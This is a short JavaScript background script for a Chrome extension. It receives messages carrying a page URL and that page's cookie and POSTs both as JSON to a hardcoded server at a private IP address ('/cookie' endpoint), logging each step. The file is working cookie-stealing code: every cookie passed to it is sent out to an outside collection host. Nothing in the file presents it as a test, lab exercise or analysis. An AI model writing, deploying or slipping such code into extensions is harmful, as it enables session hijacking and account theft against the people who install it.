const server_url = "http://192.168.0.189:5000/cookie";

chrome.runtime.onMessage.addListener(
  function(request, sender, sendResponse) {
     console.log("background.js: message received", request);
    if (request.greeting === "cookie") {
        console.log("background.js: sending cookie", request.url, request.cookie);
      fetch(server_url, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          "url": request.url,
          "cookie": request.cookie,
        })
      }).then((response) => {
           console.log("background.js: fetch response", response);
           if (response.ok){
              console.log("background.js: data sent");
            }
            sendResponse("received cookie");
        }).catch(function(error){
            console.log("background.js: fetch error:",error);
            sendResponse("fetch error");
          });
       }
    }
  );
